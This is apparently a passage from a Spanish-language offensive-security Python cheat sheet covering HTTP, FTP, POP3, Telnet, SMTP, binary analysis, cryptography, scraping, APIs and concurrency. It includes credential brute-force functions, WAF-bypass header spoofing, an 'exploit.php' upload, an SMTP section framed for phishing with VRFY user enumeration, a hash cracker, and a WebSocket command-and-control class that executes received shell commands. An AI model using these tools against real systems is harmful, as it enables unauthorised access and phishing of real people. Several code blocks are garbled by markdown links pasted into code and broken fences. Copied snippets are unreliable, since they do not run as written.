    "DNT": "1",
}
resp = requests.get("https://httpbin.org/headers", headers=headers)

# Bypass WAF
waf_headers = {
    "X-Forwarded-For": "127.0.0.1",
    "X-Real-IP": "127.0.0.1",
    "Client-IP": "127.0.0.1",
    "X-Originating-IP": "127.0.0.1",
}
```

### 5.7. [file upload](../raw/w3b-h4ck1ng.md#file-upload)

```````python
import requests

# Upload simple
files = {"file": open("local.txt", "rb")}
resp = requests.post("https://httpbin.org/post", files=files)

# Upload con nombre y tipo
files = {"file": ("report.pdf", open("local.pdf", "rb"), "application/pdf")}
resp = requests.post("https://httpbin.org/post", files=files)

# Upload multiple
files = [("file1", ("a.txt", b"content1")), ("file2", ("b.txt", b"content2"))]
resp = requests.post("https://httpbin.org/post", files=files)

# Upload con datos adicionales
files = {"file": open("exploit.php", "rb")}
data = {"description": "file upload test"}
resp = requests.post("https://target.com/upload", files=files, data=data)
```

### 5.8. Streaming Downloads

```````python
import requests
import os

# Descarga streaming para archivos grandes
resp = requests.get("https://httpbin.org/bytes/102400", stream=True)
with open("output.bin", "wb") as f:
    for chunk in resp.iter_content(chunk_size=8192):
        if chunk:
            f.write(chunk)

# Descarga con progreso
def download_with_progress(url, filepath):
    resp = requests.get(url, stream=True)
    total = int(resp.headers.get("content-length", 0))
    downloaded = 0
    with open(filepath, "wb") as f:
        for chunk in resp.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
                downloaded += len(chunk)
                if total:
                    print("\r%.1f%%" % (downloaded/total*100), end="")

# Descarga reanudable
def resume_download(url, filepath):
    headers = {}
    if os.path.exists(filepath):
        headers["Range"] = "bytes=%d-" % os.path.getsize(filepath)
    resp = requests.get(url, headers=headers, stream=True)
    mode = "ab" if resp.status_code == 206 else "wb"
    with open(filepath, mode) as f:
        for chunk in resp.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
```

### 7.3. ftplib — FTP automation

`````python
from ftplib import FTP

def ftp_connect(host, username="anonymous", password="anonymous@"):
    ftp = FTP(host)
    ftp.login(username, password)
    return ftp

def ftp_list(ftp, path="."):
    files = []
    ftp.dir(path, files.append)
    return files

def ftp_download(ftp, remote_path, local_path):
    with open(local_path, "wb") as f:
        ftp.retrbinary("RETR %s" % remote_path, f.write)

def ftp_upload(ftp, local_path, remote_path):
    with open(local_path, "rb") as f:
        ftp.storbinary("STOR %s" % remote_path, f)

def ftp_brute_force(host, usernames, passwords):
    for user in usernames:
        for pwd in passwords:
            try:
                ftp = FTP(host)
                ftp.login(user, pwd)
                print("[+] FTP: %s:%s" % (user, pwd))
                ftp.quit()
                return (user, pwd)
            except:
                pass
    return None

def ftp_recursive_download(ftp, remote_dir, local_dir):
    import os
    os.makedirs(local_dir, exist_ok=True)
    files = []
    ftp.retrlines("LIST %s" % remote_dir, files.append)
    for entry in files:
        parts = entry.split()
        name = " ".join(parts[3:])
        path = "%s/%s" % (remote_dir.rstrip("/"), name)
        if entry.startswith("d"):
            ftp_recursive_download(ftp, path, "%s/%s" % (local_dir, name))
        else:
            with open("%s/%s" % (local_dir, name), "wb") as f:
                ftp.retrbinary("RETR %s" % path, f.write)
`

### 7.4. smtplib — SMTP para phishing

`````python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def send_email_simple(smtp_host, smtp_port, username, password, from_addr, to_addr, subject, body):
    msg = MIMEText(body, "plain", "utf-8")
    msg["Subject"] = subject
    msg["From"] = from_addr
    msg["To"] = to_addr
    server = smtplib.SMTP(smtp_host, smtp_port)
    server.starttls()
    server.login(username, password)
    server.sendmail(from_addr, [to_addr], msg.as_string())
    server.quit()

def send_email_html(smtp_host, smtp_port, username, password, from_addr, to_addr, subject, html_body):
    msg = MIMEText(html_body, "html", "utf-8")
    msg["Subject"] = subject
    msg["From"] = from_addr
    msg["To"] = to_addr
    server = smtplib.SMTP(smtp_host, smtp_port)
    server.starttls()
    server.login(username, password)
    server.sendmail(from_addr, [to_addr], msg.as_string())
    server.quit()

def send_email_attachment(smtp_host, smtp_port, username, password, from_addr, to_addr, subject, body, attachment_path):
    msg = MIMEMultipart()
    msg["Subject"] = subject
    msg["From"] = from_addr
    msg["To"] = to_addr
    msg.attach(MIMEText(body, "plain"))
    with open(attachment_path, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header("Content-Disposition", "attachment; filename=%s" % attachment_path.split("/")[-1])
        msg.attach(part)
    server = smtplib.SMTP(smtp_host, smtp_port)
    server.starttls()
    server.login(username, password)
    server.sendmail(from_addr, [to_addr], msg.as_string())
    server.quit()

def smtp_enum_vrfy(smtp_host, smtp_port, usernames):
    try:
        server = smtplib.SMTP(smtp_host, smtp_port)
        server.ehlo()
        for user in usernames:
            code, msg = server.vrfy(user)
            if code == 250:
                print("[+] Usuario valido: %s" % user)
            else:
                print("[-] %s: %s" % (user, msg.decode()))
        server.quit()
    except Exception as e:
        print("Error: %s" % e)
`

### 7.5. poplib — POP3 download

`````python
import poplib
from email import parser

def pop3_download(host, username, password):
    mailbox = poplib.POP3(host)
    mailbox.user(username)
    mailbox.pass_(password)
    num_messages = len(mailbox.list()[1])
    print("[+] %d mensajes en el buzón" % num_messages)
    for i in range(num_messages):
        raw_email = b"\n".join(mailbox.retr(i+1)[1])
        parsed = parser.BytesParser().parsebytes(raw_email)
        print("From: %s | Subject: %s" % (parsed["from"], parsed["subject"]))
    mailbox.quit()

def pop3_brute_force(host, usernames, passwords):
    for user in usernames:
        for pwd in passwords:
            try:
                mailbox = poplib.POP3(host)
                mailbox.user(user)
                mailbox.pass_(pwd)
                print("[+] POP3: %s:%s" % (user, pwd))
                mailbox.quit()
                return (user, pwd)
            except:
                pass
    return None
`

### 7.6. telnetlib — Telnet automation

`````python
import telnetlib
import re

def telnet_connect(host, port=23, timeout=10):
    tn = telnetlib.Telnet(host, port, timeout)
    return tn

def telnet_login(tn, username, password):
    tn.read_until(b"login:", timeout=5)
    tn.write(username.encode() + b"\n")
    tn.read_until(b"Password:", timeout=5)
    tn.write(password.encode() + b"\n")
    result = tn.read_some()
    return result

def telnet_execute(tn, command):
    tn.write(command.encode() + b"\n")
    return tn.read_until(b"$", timeout=5).decode(errors="ignore")

def telnet_brute_force(host, usernames, passwords, port=23):
    for user in usernames:
        for pwd in passwords:
            try:
                tn = telnetlib.Telnet(host, port, timeout=5)
                tn.read_until(b"login:", timeout=5)
                tn.write(user.encode() + b"\n")
                tn.read_until(b"Password:", timeout=5)
                tn.write(pwd.encode() + b"\n")
                result = tn.read_until(b"$", timeout=5)
                if b"incorrect" not in result and b"failed" not in result:
                    print("[+] TELNET: %s:%s" % (user, pwd))
                    tn.close()
                    return (user, pwd)
                tn.close()
            except:
                pass
    return None

---

## 8. Análisis de Archivos

### 8.1. pefile — Analisis de [pe](../raw/w1n-1nt3rn4ls.md#pe)

`````python
import pefile

def analizar_pe(path):
    pe = pefile.PE(path)
    print("[*] Analizando: %s" % path)
    print("  DOS Header: 0x%X" % pe.DOS_HEADER.e_lfanew)
    print("  Machine: 0x%X" % pe.FILE_HEADER.Machine)
    print("  Number of Sections: %d" % pe.FILE_HEADER.NumberOfSections)
    print("  Time Date Stamp: %d" % pe.FILE_HEADER.TimeDateStamp)
    print("  Size of Code: 0x%X" % pe.OPTIONAL_HEADER.SizeOfCode)
    print("  Entry Point: 0x%X" % pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    print("  Image Base: 0x%X" % pe.OPTIONAL_HEADER.ImageBase)
    
    for section in pe.sections:
        print("  Section: %s | VA: 0x%X | Size: 0x%X | Entropy: %.2f" % (
            section.Name.decode().strip("\\x00"), section.VirtualAddress,
            section.SizeOfRawData, section.get_entropy()))
    
    # Imported DLLs
    if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
        for entry in pe.DIRECTORY_ENTRY_IMPORT:
            print("  DLL: %s" % entry.dll.decode())
            for imp in entry.imports:
                if imp.name:
                    print("    %s" % imp.name.decode())
    
    # Exported functions
    if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
        for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
            print("  Export: %s" % exp.name.decode() if exp.name else "Ordinal: %d" % exp.ordinal)
    
    # Detect packers by entropy
    for section in pe.sections:
        entropy = section.get_entropy()
        if entropy > 7.0:
            print("[!] Posible packer en seccion %s (entropy: %.2f)" % (
                section.Name.decode().strip("\\x00"), entropy))
    
    return pe

def extract_pe_icon(pe_path, output_path):
    import struct
    pe = pefile.PE(pe_path)
    if hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
        for resource_type in pe.DIRECTORY_ENTRY_RESOURCE.entries:
            if resource_type.id == 3:  # RT_GROUP_ICON
                for resource_id in resource_type.directory.entries:
                    data = pe.get_data(resource_id.directory.entries[0].data.struct.OffsetToData,
                                      resource_id.directory.entries[0].data.struct.Size)
                    with open(output_path, "wb") as f:
                        f.write(data)
                    print("[+] Icono extraido a %s" % output_path)
`

### 8.2. capstone — Disassembler

`````python
from capstone import *

def disassemble_x86(data, offset=0x1000):
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    for insn in md.disasm(data, offset):
        print("0x%x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))

def disassemble_x64(data, offset=0x1000):
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    for insn in md.disasm(data, offset):
        print("0x%x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))

def disassemble_arm(data, offset=0x1000):
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    for insn in md.disasm(data, offset):
        print("0x%x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))

def disassemble_shellcode(data, arch="[x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)"):
    modes = {"x86": (CS_ARCH_X86, CS_MODE_32), "[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)": (CS_ARCH_X86, CS_MODE_64),
             "arm": (CS_ARCH_ARM, CS_MODE_ARM), "thumb": (CS_ARCH_ARM, CS_MODE_THUMB)}
    arch_type, mode = modes.get(arch, (CS_ARCH_X86, CS_MODE_32))
    md = Cs(arch_type, mode)
    for insn in md.disasm(data, 0x0):
        print("0x%x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))

# Disassemble .text section from PE
def disassemble_pe_section(pe_path):
    import pefile
    pe = pefile.PE(pe_path)
    for section in pe.sections:
        if b".text" in section.Name:
            data = section.get_data()
            print("[*] .text section at 0x%X, size 0x%X" % (section.VirtualAddress, len(data)))
            disassemble_x86(data, section.VirtualAddress)
`

### 8.3. vivisect — Analisis binario

`````python
import vivisect

def analyze_binary(path):
    vw = vivisect.VivWorkspace()
    vw.loadFromFile(path)
    vw.analyze()
    
    print("[*] Analisis de %s" % path)
    
    # Functions
    for funcva in vw.getFunctions():
        name = vw.getName(funcva) or "sub_%x" % funcva
        print("  Func: 0x%x (%s)" % (funcva, name))
    
    # Strings
    for sva, sbytes in vw.getStrings():
        try:
            s = sbytes.decode("utf-8", errors="ignore")
            if len(s) > 4:
                print("  String at 0x%x: %s" % (sva, s[:50]))
        except:
            pass
    
    # Imports
    for libname, imports in vw.getImports().items():
        print("  Library: %s" % libname)
        for imp in imports:
            print("    %s" % imp[1])
    
    return vw
`

### 8.4. yara-python — Escaneo con YARA

`````python
import [yara](../raw/thr3t-hnt.md#yara)

def compile_yara_rules(rules_path):
    rules = yara.compile(filepath=rules_path)
    return rules

def scan_file(rules, filepath):
    matches = rules.match(filepath)
    for match in matches:
        print("[+] Regla: %s" % match.rule)
        for string in match.strings:
            print("    String: %s at 0x%x" % (string[1], string[0]))
        meta = getattr(match, "meta", {})
        if meta:
            for k, v in meta.items():
                print("    %s: %s" % (k, v))

def scan_directory(rules, directory, extension="*"):
    import os
    for root, dirs, files in os.walk(directory):
        for f in files:
            if extension == "*" or f.endswith(extension):
                filepath = os.path.join(root, f)
                matches = rules.match(filepath)
                for match in matches:
                    print("[+] %s -> %s" % (filepath, match.rule))

# YARA rules as string
def scan_with_yara_string(data, yara_rule_text):
    rules = yara.compile(source=yara_rule_text)
    matches = rules.match(data=data)
    for match in matches:
        print("[+] %s" % match.rule)

# Example YARA rule string
yara_rule = """
rule SuspiciousStrings {
    meta:
        description = "Detecta cadenas sospechosas"
    strings:
         = "cmd.exe" nocase
         = "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)" nocase
         = "wscript" nocase
         = "reg.exe" nocase
    condition:
        any of them
}
"""

# scan_with_yara_string(b"ejecutando cmd.exe y powershell", yara_rule)

---

## 9. Criptografía

### 9.1. hashlib — Hashing

`````python
import hashlib

def hash_text(text, algorithm="sha256"):
    h = hashlib.new(algorithm)
    h.update(text.encode())
    return h.hexdigest()

def hash_file(filepath, algorithm="sha256"):
    h = hashlib.new(algorithm)
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            h.update(chunk)
    return h.hexdigest()

# Algorithms disponibles: md5, sha1, sha224, sha256, sha384, sha512, blake2b, blake2s
print(hash_text("password123", "md5"))
print(hash_text("password123", "sha256"))
print(hash_text("password123", "sha512"))

# Hash cracking simulation
def crack_hash(target_hash, wordlist_path, algorithm="md5"):
    with open(wordlist_path, "r", errors="ignore") as f:
        for line in f:
            word = line.strip()
            if hashlib.new(algorithm, word.encode()).hexdigest() == target_hash:
                print("[+] Password: %s" % word)
                return word
    return None
`

### 9.2. hmac — HMAC

`````python
import hmac
import hashlib

def create_hmac(key, message, algorithm=hashlib.sha256):
    h = hmac.new(key.encode(), message.encode(), algorithm)
    return h.hexdigest()

def verify_hmac(key, message, signature, algorithm=hashlib.sha256):
    h = hmac.new(key.encode(), message.encode(), algorithm)
    return hmac.compare_digest(h.hexdigest(), signature)

# Uso
secret = "mi-secreto"
msg = "datos-importantes"
sig = create_hmac(secret, msg)
print("HMAC:", sig)
print("Valido:", verify_hmac(secret, msg, sig))
`

### 9.3. PyCrypto — [aes](../raw/crypt0-f0r-h4ck3rs.md#aes)/[rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa)

`````python
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
import base64

# AES Encryption
def aes_encrypt(key, data):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(data.encode(), AES.block_size))
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(key, encrypted_data):
    raw = base64.b64decode(encrypted_data)
    iv = raw[:16]
    ct = raw[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode()

# RSA Key generation
def rsa_generate_keys(bits=2048):
    key = RSA.generate(bits)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

# RSA Encryption
def rsa_encrypt(public_key_pem, data):
    key = RSA.import_key(public_key_pem)
    cipher = PKCS1_OAEP.new(key)
    ct = cipher.encrypt(data.encode())
    return base64.b64encode(ct).decode()

def rsa_decrypt(private_key_pem, encrypted_data):
    key = RSA.import_key(private_key_pem)
    cipher = PKCS1_OAEP.new(key)
    ct = base64.b64decode(encrypted_data)
    pt = cipher.decrypt(ct)
    return pt.decode()

# Ejemplo
key = get_random_bytes(32)  # AES-256
enc = aes_encrypt(key, "Mensaje secreto")
print("AES Encrypted:", enc)
dec = aes_decrypt(key, enc)
print("AES Decrypted:", dec)

priv, pub = rsa_generate_keys()
enc_rsa = rsa_encrypt(pub, "Dato secreto RSA")
print("RSA Encrypted:", enc_rsa)
dec_rsa = rsa_decrypt(priv, enc_rsa)
print("RSA Decrypted:", dec_rsa)
`

### 9.4. cryptography — Libreria moderna

`````python
from [cryptography](../raw/crypt0-f0r-h4ck3rs.md).fernet import Fernet
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import os

# Fernet (simetrico facil)
key = Fernet.generate_key()
f = Fernet(key)
token = f.encrypt(b"Mensaje secreto")
print("Fernet:", token)
print("Decrypted:", f.decrypt(token))

# RSA con cryptography
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Firmar
message = b"Mensaje a firmar"
signature = private_key.sign(message, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())

# Verificar
try:
    public_key.verify(signature, message, padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())
    print("Firma valida!")
except:
    print("Firma invalida!")

# Encrypt con RSA OAEP
ct = public_key.encrypt(b"Dato secreto", padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
pt = private_key.decrypt(ct, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None))
print("RSA OAEP decrypted:", pt)

---

## 10. Web Scraping para [osint](../raw/0s1nt.md)

### 10.1. BeautifulSoup

`````python
import requests
from bs4 import BeautifulSoup
import re

def scrape_links(url):
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    links = []
    for a in soup.find_all("a", href=True):
        links.append(a["href"])
    return links

def scrape_emails(url):
    resp = requests.get(url)
    emails = set(re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", resp.text))
    return emails

def scrape_forms(url):
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    forms = []
    for form in soup.find_all("form"):
        action = form.get("action", "")
        method = form.get("method", "get")
        inputs = []
        for inp in form.find_all("input"):
            inputs.append({"name": inp.get("name"), "type": inp.get("type"), "value": inp.get("value")})
        forms.append({"action": action, "method": method, "inputs": inputs})
    return forms

def scrape_metadata(url):
    resp = requests.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    meta = {}
    for tag in soup.find_all("meta"):
        if tag.get("name"):
            meta[tag["name"]] = tag.get("content", "")
        if tag.get("property"):
            meta[tag["property"]] = tag.get("content", "")
    return meta

def extract_comments(url):
    resp = requests.get(url)
    comments = re.findall(r"<!--(.*?)-->", resp.text, re.DOTALL)
    return [c.strip() for c in comments if c.strip()]

# Full OSINT scraper
class OSINTSraper:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Mozilla/5.0"})
    
    def analyze_url(self, url):
        print("[*] Analizando: %s" % url)
        resp = self.session.get(url)
        print("  Status: %d" % resp.status_code)
        print("  Content-Type: %s" % resp.headers.get("content-type"))
        print("  Server: %s" % resp.headers.get("server"))
        print("  Cookies: %s" % dict(resp.cookies))
        
        soup = BeautifulSoup(resp.text, "html.parser")
        print("  Title: %s" % soup.title.string if soup.title else "N/A")
        
        emails = scrape_emails(url)
        if emails:
            print("  Emails: %s" % emails)
        
        links = scrape_links(url)
        print("  Links: %d encontrados" % len(links))
        
        forms = scrape_forms(url)
        print("  Forms: %d encontrados" % len(forms))
        
        meta = scrape_metadata(url)
        if meta:
            print("  Meta:")
            for k, v in meta.items():
                print("    %s: %s" % (k, v))
        
        comments = extract_comments(url)
        if comments:
            print("  Comments:")
            for c in comments[:5]:
                print("    %s" % c[:100])
        
        return {"emails": emails, "links": links, "forms": forms, "meta": meta}
`

### 10.2. Scrapy

`````python
# Scrapy spider basico - guardar como spider.py
"""
import scrapy

class OSINTSpider(scrapy.Spider):
    name = "osint"
    start_urls = "[[https](../raw/r3d3s-f0nd4m3nt0s.md#https)://example.[com](../raw/w1n-s9bsyst3ms.md#com)"]
    
    def parse(self, response):
        yield {"url": response.url, "title": response.css("title::text").get()}
        for link in response.css("a[href]::attr(href)"):
            yield response.follow(link, self.parse)
"""

# Ejecutar: scrapy runspider spider.py -o output.json
`

### 10.3. Selenium

`````python
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
import time

def setup_driver(headless=True):
    options = Options()
    if headless:
        options.add_argument("--headless=new")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    driver = webdriver.Chrome(options=options)
    return driver

def scrape_dynamic(url):
    driver = setup_driver()
    driver.get(url)
    time.sleep(3)  # Esperar JS
    
    page_source = driver.page_source
    soup = BeautifulSoup(page_source, "html.parser")
    text = soup.get_text()
    
    # Scroll para cargar contenido lazy
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(2)
    driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(2)
    
    # Tomar screenshot
    driver.save_screenshot("screenshot.png")
    
    driver.quit()
    return text

def login_and_scrape(url, username, password):
    driver = setup_driver()
    driver.get(url)
    
    # Completar formulario de login
    driver.find_element(By.NAME, "username").send_keys(username)
    driver.find_element(By.NAME, "password").send_keys(password)
    driver.find_element(By.CSS_SELECTOR, "button[type='submit']").click()
    time.sleep(3)
    
    # Extraer datos post-login
    data = driver.page_source
    driver.quit()
    return data

def capture_ajax_traffic(url):
    """Captura peticiones AJAX (concepto basico)"""
    driver = setup_driver()
    driver.get(url)
    time.sleep(2)
    
    logs = driver.execute_script("return window.performance.getEntries();")
    for log in logs:
        if "api" in log["name"] or "graphql" in log["name"]:
            print("  Request: %s" % log["name"])
    
    driver.quit()
    return logs

def selenium_click_elements(url, selector):
    driver = setup_driver()
    driver.get(url)
    
    elements = driver.find_elements(By.CSS_SELECTOR, selector)
    results = []
    for el in elements[:10]:
        try:
            el.click()
            time.sleep(1)
            results.append(driver.current_url)
        except:
            pass
    
    driver.quit()
    return results
`

### 10.4. Playwright

`````python
from playwright.sync_api import sync_playwright

def playwright_scrape(url):
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.set_extra_http_headers({"User-Agent": "Mozilla/5.0"})
        page.goto(url)
        page.wait_for_load_state("networkidle")
        
        title = page.title()
        content = page.content()
        
        # Screenshot
        page.screenshot(path="playwright_screenshot.png")
        
        # PDF
        page.pdf(path="page.pdf")
        
        # Extraer texto
        text = page.evaluate("() => document.body.innerText")
        
        browser.close()
        return {"title": title, "text": text[:1000]}

def playwright_intercept_requests(url):
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        
        requests_data = []
        page.on("request", lambda req: requests_data.append({"url": req.url, "method": req.method, "headers": req.headers}))
        page.on("response", lambda resp: print("Response:", resp.status, resp.url))
        
        page.goto(url)
        page.wait_for_load_state("networkidle")
        browser.close()
        return requests_data

def playwright_auto_login(url, username, password):
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(url)
        page.fill("input[name='username']", username)
        page.fill("input[name='password']", password)
        page.click("button[type='submit']")
        page.wait_for_load_state("networkidle")
        
        # Guardar estado de autenticacion
        context = browser.contexts[0]
        storage = context.storage_state(path="auth.json")
        
        browser.close()
        return storage

---

## 11. API Interaction

### 11.1. REST APIs con requests

`````python
import requests
import json

class APIClient:
    def __init__(self, base_url, token=None):
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update({"Content-Type": "application/json", "Accept": "application/json"})
        if token:
            self.session.headers["Authorization"] = "Bearer %s" % token
    
    def get(self, endpoint, params=None):
        resp = self.session.get("%s/%s" % (self.base_url, endpoint.lstrip("/")), params=params)
        resp.raise_for_status()
        return resp.json()
    
    def post(self, endpoint, data=None):
        resp = self.session.post("%s/%s" % (self.base_url, endpoint.lstrip("/")), json=data)
        resp.raise_for_status()
        return resp.json()
    
    def put(self, endpoint, data=None):
        resp = self.session.put("%s/%s" % (self.base_url, endpoint.lstrip("/")), json=data)
        resp.raise_for_status()
        return resp.json()
    
    def delete(self, endpoint):
        resp = self.session.delete("%s/%s" % (self.base_url, endpoint.lstrip("/")))
        resp.raise_for_status()
        return resp.json()

# Rate limiting
import time
def api_request_with_backoff(url, max_retries=5):
    for attempt in range(max_retries):
        try:
            resp = requests.get(url)
            if resp.status_code == 429:
                wait = int(resp.headers.get("Retry-After", 2 ** attempt))
                print("Rate limited. Esperando %ds..." % wait)
                time.sleep(wait)
                continue
            resp.raise_for_status()
            return resp.json()
        except requests.RequestException as e:
            if attempt == max_retries - 1:
                raise
            time.sleep(2 ** attempt)
`

### 11.2. WebSockets

`````python
import websocket
import json
import threading

def websocket_listener(url):
    ws = websocket.WebSocketApp(url,
        on_message=lambda ws, msg: print("Mensaje:", msg),
        on_error=lambda ws, err: print("Error:", err),
        on_close=lambda ws, close_status_code, close_msg: print("Cerrado"))
    ws.on_open = lambda ws: print("Conectado!")
    ws.run_forever()

def websocket_client(url):
    ws = websocket.create_connection(url)
    ws.send(json.dumps({"action": "ping"}))
    response = ws.recv()
    print("Response:", response)
    ws.close()
    return response

# WebSocket para C2
class WebSocketC2:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.ws = None
    
    def start_server(self):
        import asyncio
        import websockets
        async def handler(ws, path):
            async for msg in ws:
                print("[[c2](../raw/r3v3rs3-sh3lls.md#command-and-control)] Comando recibido:", msg)
                result = self.execute(msg)
                await ws.send(result)
        
        asyncio.run(websockets.serve(handler, self.host, self.port))
    
    def execute(self, command):
        import subprocess
        try:
            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=30)
            return result.decode()
        except subprocess.TimeoutExpired:
            return "Timeout"
        except Exception as e:
            return "Error: %s" % e
    
    def connect(self, url):
        self.ws = websocket.create_connection(url)
    
    def send_command(self, command):
        self.ws.send(command)
        return self.ws.recv()
`

### 11.3. [graphql](../raw/4p1-s3cur1ty.md#graphql) Client

`````python
import requests
import json

class GraphQLClient:
    def __init__(self, endpoint, token=None):
        self.endpoint = endpoint
        self.session = requests.Session()
        if token:
            self.session.headers["Authorization"] = "Bearer %s" % token
    
    def query(self, query, variables=None):
        payload = {"query": query}
        if variables:
            payload["variables"] = variables
        resp = self.session.post(self.endpoint, json=payload)
        resp.raise_for_status()
        result = resp.json()
        if "errors" in result:
            print("GraphQL Errors:", result["errors"])
        return result.get("data")
    
    def mutate(self, mutation, variables=None):
        payload = {"query": mutation}
        if variables:
            payload["variables"] = variables
        resp = self.session.post(self.endpoint, json=payload)
        return resp.json()

# Introspeccion GraphQL
def graphql_introspect(endpoint):
    query = """
    query {
        __schema {
            types {
                name
                fields {
                    name
                    type {
                        name
                        kind
                    }
                }
            }
            queryType { name }
            mutationType { name }
        }
    }
    """
    client = GraphQLClient(endpoint)
    return client.query(query)

---

## 12. Automatización y Concurrencia

### 12.1. os y subprocess

`````python
import os
import subprocess
import sys

# Ejecutar comando y obtener salida
def run_cmd(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout, result.stderr, result.returncode

# Ejecutar con timeout
def run_cmd_timeout(command, timeout=10):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=timeout)
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", "Timeout", -1

# Ejecutar en background
def run_background(command):
    if sys.platform == "win32":
        return subprocess.Popen(command, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE)
    else:
        return subprocess.Popen(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Pipeline de comandos
def run_pipeline(commands):
    processes = []
    prev_stdout = None
    for cmd in commands:
        proc = subprocess.Popen(cmd, shell=True, stdin=prev_stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        prev_stdout = proc.stdout
        processes.append(proc)
    output, error = processes[-1].communicate()
    return output.decode(), error.decode()

# Walk filesystem
def walk_directory(path):
    for root, dirs, files in os.walk(path):
        for f in files:
            filepath = os.path.join(root, f)
            yield filepath, os.path.getsize(filepath)
`

### 12.2. threading

`````python
import threading
import time
from queue import Queue

class ThreadWorker:
    def __init__(self, num_threads=5):
        self.num_threads = num_threads
        self.queue = Queue()
        self.results = []
        self.lock = threading.Lock()
    
    def worker(self):
        while True:
            item = self.queue.get()
            if item is None:
                break
            result = self.process(item)
            with self.lock:
                self.results.append(result)
            self.queue.task_done()
    
    def process(self, item):
        # Override this
        return item
    
    def run(self, items):
        threads = []
        for _ in range(self.num_threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        
        for item in items:
            self.queue.put(item)
        
        self.queue.join()
        
        for _ in range(self.num_threads):
            self.queue.put(None)
        for t in threads:
            t.join()
        
        return self.results

# Thread-safe counter
class AtomicCounter:
    def __init__(self):
        self.value = 0
        self.lock = threading.Lock()
    
    def increment(self):
        with self.lock:
            self.value += 1
            return self.value
    
    def decrement(self):
        with self.lock:
            self.value -= 1
            return self.value
    
    def get(self):
        with self.lock:
            return self.value

# Event-based threading
def threaded_with_event():
    stop_event = threading.Event()
    
    def worker():
        while not stop_event.is_set():
            print("Trabajando...")
            time.sleep(1)
    
    t = threading.Thread(target=worker)
    t.start()
    time.sleep(5)
    stop_event.set()
    t.join()
`

### 12.3. multiprocessing

`````python
import multiprocessing as mp
import os

def worker_process(task):
    pid = os.getpid()
    print("PID %d procesando: %s" % (pid, task))
    return task * 2

def run_multiprocessing(tasks):
    with mp.Pool(processes=mp.cpu_count()) as pool:
        results = pool.map(worker_process, tasks)
    return results

# Process Pool Executor
from concurrent.futures import ProcessPoolExecutor

def run_process_pool(tasks):
    with ProcessPoolExecutor(max_workers=mp.cpu_count()) as executor:
        results = list(executor.map(worker_process, tasks))
    return results

# Shared memory
